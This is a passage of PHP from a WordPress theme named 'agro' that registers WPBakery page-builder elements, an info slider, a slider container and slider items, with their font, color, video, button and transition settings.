                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            ),
        )));
    }
}

/*******************************/
/* info slider
/******************************/
if (!function_exists('agro_info_slider_integrateWithVC')) {
    add_action('vc_before_init', 'agro_info_slider_integrateWithVC');
    function agro_info_slider_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Info Slider', 'agro'),
        'base' => 'agro_info_slider',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'sdesc',
                'heading' => esc_html__('Section Description', 'agro')
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Info in Slider', 'agro'),
                'params' => array(
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Info Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6 pt15'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'thintitle',
                        'heading' => esc_html__('Info Thin Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Info Description', 'agro'),
                    ),
                )
            ),
            // slider options
           array(
               'type' => 'nt_spacer',
               'param_name' => 'slider_spacer',
               'heading' => esc_html__('Slider Options', 'agro'),
           ),
           array(
               'type' => 'checkbox',
               'param_name' => 'autoplay',
               'heading' => esc_html__('Auto play?', 'agro'),
               'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
               'edit_field_class' => 'vc_col-sm-4',
           ),
           array(
               'type' => 'checkbox',
               'param_name' => 'pauseonhover',
               'heading' => esc_html__('Pause on hover?', 'agro'),
               'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
               'edit_field_class' => 'vc_col-sm-4',
           ),
           array(
               'type' => 'checkbox',
               'param_name' => 'dots',
               'heading' => esc_html__('Dots?', 'agro'),
               'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
               'edit_field_class' => 'vc_col-sm-4',
           ),
           array(
               'type' => 'textfield',
               'param_name' => 'speed',
               'heading' => esc_html__('Speed', 'agro'),
               'description' => esc_html__('Use simple number.default 1000 (1s).', 'agro'),
               'edit_field_class' => 'vc_col-sm-4'
           ),
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Background Image', 'agro'),
                'group' => esc_html__('Images', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgw',
                'heading' => esc_html__('Background Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Background Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Slider Image', 'agro'),
                'group' => esc_html__('Images', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Slider Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Slider Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slide_spacer',
                'heading' => esc_html__('Slider Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'stclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'sthtclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'sdescclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            ),
        )));
    }
}



/*******************************/
/* Slider Container
/******************************/
if (!function_exists('agro_slider_container_integrateWithVC')) {
    add_action('vc_before_init', 'agro_slider_container_integrateWithVC');
    function agro_slider_container_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Slider Container', 'agro'),
        'base' => 'agro_slider_container',
        "as_parent" => array('only' => 'agro_slider_item1,agro_slider_item2,agro_slider_item3,agro_slider_item4'),
        "content_element" => true,
        "show_settings_on_create" => true,
        "is_container" => true,
        "js_view" => 'VcColumnView',
        'class' => 'vc_nt-nested-container',
        'icon' => 'nt_logo',
        'category'=> 'AGRO',
        'params'   => array(
            array(
                'type' => 'checkbox',
                'param_name' => 'autoplay',
                'heading' => esc_html__('Auto play?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'timer',
                'heading' => esc_html__('Timer?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'dots',
                'heading' => esc_html__('Dots?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'std' => 'yes',
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'duration',
                'heading' => esc_html__('Duration', 'agro'),
                'description' => esc_html__('Use simple number.default 4000 (4s).', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay',
                'heading' => esc_html__('Delay', 'agro'),
                'description' => esc_html__('Use simple number.default 4000 (4s).', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Slider Overlay', 'agro'),
                'param_name' => 'overlay',
                'edit_field_class' => 'vc_col-sm-4',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Overlay 1', 'agro') => '01',
                    esc_html__('Overlay 2', 'agro') => '02',
                    esc_html__('Overlay 3', 'agro') => '03',
                    esc_html__('Overlay 4', 'agro') => '04',
                    esc_html__('Overlay 5', 'agro') => '05',
                    esc_html__('Overlay 6', 'agro') => '06',
                    esc_html__('Overlay 7', 'agro') => '07',
                    esc_html__('Overlay 8', 'agro') => '08',
                    esc_html__('Overlay 9', 'agro') => '09',
                    esc_html__('None', 'agro') => 'none',
                )
            ),

            array(
                'type' => 'param_group',
                'heading' => esc_html__('Crate Custom Transition', 'nt-agricom' ),
                'description'=> esc_html__('Add more transition type to slide item.', 'nt-agricom' ),
                'param_name' => 'sloop',
                'group' => esc_html__('Transition', 'nt-agricom' ),
                'params' => array(
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Transition type', 'nt-agricom' ),
                        'param_name' => 'transition',
                        'admin_label' => true,
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option',  'nt-agricom' )	=> '',
                            esc_html__('fade', 'nt-agricom' )	    => 'fade',
                            esc_html__('fade2', 'nt-agricom' )	    => 'fade2',
                            esc_html__('slideLeft', 'nt-agricom' )	=> 'slideLeft',
                            esc_html__('slideLeft2', 'nt-agricom' )	=> 'slideLeft2',
                            esc_html__('slideRight', 'nt-agricom' )	=> 'slideRight',
                            esc_html__('slideRight2', 'nt-agricom' )=> 'slideRight2',
                            esc_html__('slideUp', 'nt-agricom' )	=> 'slideUp',
                            esc_html__('slideUp2', 'nt-agricom' )	=> 'slideUp2',
                            esc_html__('slideDown', 'nt-agricom' )	=> 'slideDown',
                            esc_html__('slideDown2', 'nt-agricom' )	=> 'slideDown2',
                            esc_html__('zoomIn', 'nt-agricom' )	    => 'zoomIn',
                            esc_html__('zoomIn2', 'nt-agricom' )	=> 'zoomIn2',
                            esc_html__('zoomOut', 'nt-agricom' )	=> 'zoomOut',
                            esc_html__('zoomOut2', 'nt-agricom' )	=> 'zoomOut2',
                            esc_html__('swirlLeft', 'nt-agricom' )	=> 'swirlLeft',
                            esc_html__('swirlLeft2', 'nt-agricom' )	=> 'swirlLeft2',
                            esc_html__('swirlRight', 'nt-agricom' )	=> 'swirlRight',
                            esc_html__('swirlRight2', 'nt-agricom' )=> 'swirlRight2',
                            esc_html__('burn', 'nt-agricom' )	    => 'burn',
                            esc_html__('burn2', 'nt-agricom' )	    => 'burn2',
                            esc_html__('blur', 'nt-agricom' )	    => 'blur',
                            esc_html__('blur2', 'nt-agricom' )	    => 'blur2',
                            esc_html__('flash', 'nt-agricom' )	    => 'flash',
                            esc_html__('flash2', 'nt-agricom' )	    => 'flash2'
                        )
                    )
                )
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dotsclr',
                'heading' => esc_html__('Dots color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dotsactclr',
                'heading' => esc_html__('Active dots color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'progressclr',
                'heading' => esc_html__('Progress color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discoverclr',
                'heading' => esc_html__('Discover line color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            )
        )));
    }
}

if (class_exists('WPBakeryShortCodesContainer')) {
    class WPBakeryShortCode_Agro_Slider_Container extends WPBakeryShortCodesContainer
    {
    }
}
/*******************************/
/* Slider item Style 1
/******************************/
if (!function_exists('agro_slider_item1_integrateWithVC')) {
    add_action('vc_before_init', 'agro_slider_item1_integrateWithVC');
    function agro_slider_item1_integrateWithVC()
    {
        vc_map(
            array(
                'name' => esc_html__('Slider Item Style 1', 'agro'),
                'base' => 'agro_slider_item1',
                "as_child" => array('only' => 'agro_slider_container'),
                "content_element" => true,
                "show_settings_on_create"  => true,
                'icon' => 'nt_logo',
                'category' => 'AGRO',
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Slider image', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Change Slide Delay', 'agro'),
                        'description' => esc_html__('Use simple number.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'subtitle',
                        'heading' => esc_html__('Slider subtitle', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Slider title', 'agro')
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Slider description', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr0'
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'link',
                        'heading' => esc_html__('Slider button link and title', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr1'
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Content Column Width', 'agro'),
                        'param_name' => 'xl',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('6 column', 'agro') => 'col-xl-6',
                            esc_html__('7 column', 'agro') => 'col-xl-7',
                            esc_html__('8 column', 'agro') => 'col-xl-8',
                            esc_html__('9 column', 'agro') => 'col-xl-9',
                            esc_html__('10 column', 'agro') => 'col-xl-10',
                            esc_html__('11 column', 'agro') => 'col-xl-11',
                            esc_html__('12 column', 'agro') => 'col-xl-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Alignment', 'agro'),
                        'param_name' => 'alignment',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('left', 'agro') => 'text-left',
                            esc_html__('center', 'agro') => 'text-center',
                            esc_html__('right', 'agro') => 'text-right',
                        )
                    ),
                    // video
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'video',
                        'heading' => esc_html__('Add background video', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'mute',
                        'heading' => esc_html__('Mute', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'loop',
                        'heading' => esc_html__('Loop', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'videosrc',
                        'heading' => esc_html__('Video source', 'agro'),
                        'description' => esc_html__('Add local video url to here.', 'agro'),
                        'group' => esc_html__('Video', 'agro'),
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    // fonts
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'fonts_spacer',
                        'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                        'group' => esc_html__('Fonts', 'agro')
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'usefonts',
                        'heading' => esc_html__('Use Google Fonts?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Heading tag', 'agro'),
                        'param_name' => 'htag',
                        'group' => esc_html__('Fonts', 'agro'),
                        'value' => array(
                            esc_html__('Select tag', 'agro') => '',
                            esc_html__('h1', 'agro') => 'h1',
                            esc_html__('h2', 'agro') => 'h2',
                            esc_html__('h3', 'agro') => 'h3',
                            esc_html__('h4', 'agro') => 'h4',
                            esc_html__('h5', 'agro') => 'h5',
                            esc_html__('h6', 'agro') => 'h6',
                            esc_html__('div', 'agro') => 'div',
                            esc_html__('p', 'agro') => 'p',
                            esc_html__('span', 'agro') => 'span'
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'tsize',
                        'heading' => esc_html__('Font size', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'lheight',
                        'heading' => esc_html__('Line height', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'google_fonts',
                        'param_name' => 'google_fonts',
                        'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                        'group' => esc_html__('Fonts', 'agro'),
                        'settings' => array(
                            'fields' => array(
                                'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                                'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                            )
                        ),
                        'dependency' => array(
                            'element' => 'usefonts',
                            'not_empty' => true
                        )
                    ),
                    // color
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'stclr',
                        'heading' => esc_html__('Subtitle color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4 pt15'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'tclr',
                        'heading' => esc_html__('Title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'dclr',
                        'heading' => esc_html__('Description color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'btn_spacer',
                        'heading' => esc_html__('Button Customize', 'agro'),
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button type', 'agro'),
                        'param_name' => 'btntype',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Round', 'agro') => 'btn-round',
                            esc_html__('Square', 'agro') => 'btn-square',
                            esc_html__('Rounded', 'agro') => 'btn-rounded'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button style', 'agro'),
                        'param_name' => 'btnstyle',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                            esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button size', 'agro'),
                        'param_name' => 'btnsize',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Big', 'agro') => 'custom-btn--big',
                            esc_html__('Medium', 'agro') => 'custom-btn--medium',
                            esc_html__('Small', 'agro') => 'custom-btn--small'
                        )
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr2',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbg',
                        'heading' => esc_html__('Button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbg',
                        'heading' => esc_html__('Hover button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr3',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnclr',
                        'heading' => esc_html__('Button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrclr',
                        'heading' => esc_html__('Hover button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr4',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbrd',
                        'heading' => esc_html__('Button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbrd',
                        'heading' => esc_html__('Hover button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                )
            )
        );
    }
    if (class_exists('WPBakeryShortCode')) {
        class WPBakeryShortCode_Agro_Slider_Item1 extends WPBakeryShortCode
        {
        }
    }
}

/*******************************/
/* Slider item Style 2
/******************************/
if (!function_exists('agro_slider_item2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_slider_item2_integrateWithVC');
    function agro_slider_item2_integrateWithVC()
    {
        vc_map(
            array(
                'name' => esc_html__('Slider Item Style 2', 'agro'),
                'base' => 'agro_slider_item2',
                "as_child" => array('only' => 'agro_slider_container'),
                "content_element" => true,
                "show_settings_on_create"  => true,
                'icon' => 'nt_logo',
                'category' => 'AGRO',
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Slider image', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Change Slide Delay', 'agro'),
                        'description' => esc_html__('Use simple number.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr0'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'subtitle',
                        'heading' => esc_html__('Slider subtitle', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Slider title', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'thintitle',
                        'heading' => esc_html__('Slider thin title', 'agro')
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Slider description', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr1'
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'link',
                        'heading' => esc_html__('Slider button link and title', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr2'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'vurl',
                        'heading' => esc_html__('Video Url', 'agro'),
                        'description' => esc_html__('e.g : http://player.vimeo.com/video/44309170', 'agro'),
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr3'
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Content Column Width', 'agro'),
                        'param_name' => 'xl',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('6 column', 'agro') => 'col-xl-6',
                            esc_html__('7 column', 'agro') => 'col-xl-7',
                            esc_html__('8 column', 'agro') => 'col-xl-8',
                            esc_html__('9 column', 'agro') => 'col-xl-9',
                            esc_html__('10 column', 'agro') => 'col-xl-10',
                            esc_html__('11 column', 'agro') => 'col-xl-11',
                            esc_html__('12 column', 'agro') => 'col-xl-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Content Column Width', 'agro'),
                        'param_name' => 'xl',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('6 column', 'agro') => 'col-xl-6',
                            esc_html__('7 column', 'agro') => 'col-xl-7',
                            esc_html__('8 column', 'agro') => 'col-xl-8',
                            esc_html__('9 column', 'agro') => 'col-xl-9',
                            esc_html__('10 column', 'agro') => 'col-xl-10',
                            esc_html__('11 column', 'agro') => 'col-xl-11',
                            esc_html__('12 column', 'agro') => 'col-xl-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Alignment', 'agro'),
                        'param_name' => 'alignment',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
